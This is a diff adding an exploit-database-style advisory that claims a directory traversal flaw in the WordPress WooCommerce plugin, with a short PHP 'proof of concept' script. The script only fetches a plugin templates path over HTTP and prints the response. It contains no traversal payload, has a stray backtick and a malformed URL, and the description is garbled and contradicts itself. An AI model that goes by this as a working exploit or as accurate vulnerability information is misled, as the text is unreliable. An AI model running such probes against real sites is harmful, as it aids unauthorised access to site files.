@@ -1,0 +1,43 @@
+# Exploit Title: WordPress woocommerce  directory traversal
+# Date: 28-11-2017
+# Software Link: https://wordpress.org/plugins/woocommerce/
+# Exploit Author:fu2x2000
+# Contact: fu2x2000@gmail.com
+# Website:
+# CVE:2017-17058
+#Version:Tested on WordPress 4.8.3 woocommerce 2.0/3.0
+# Category: webapps
+
+
+1. Description
+
+Identifying woo commerce theme pluging properly sanitized against Directory
+Traversal,even the latest version of WordPress with woocommerce can be
+vulnerable.
+
+2. Proof of Concept
+
+$woo = "www/wp-content/plugins/woocommerce/templates/emails/plain/"; `
+function file_get_contents_utf8($fn) {
+    $opts = array(
+        'http' => array(
+            'method'=>"GET",
+            'header'=>"Content-Type: text/html; charset=utf-8"
+        )
+    );
+
+    $wp = stream_context_create($opts);
+    $result = @file_get_contents($fn,false,$wp);
+    return $result;
+}
+/* $head= header("Content-Type: text/html; charset=utf-8"); ; */
+header("Content-Type: text/html; charset=utf-8");
+
+$result = file_get_contents_utf8("http://".$woo);
+
+echo $result;
+
+
+Regards
+
+Fu2x200
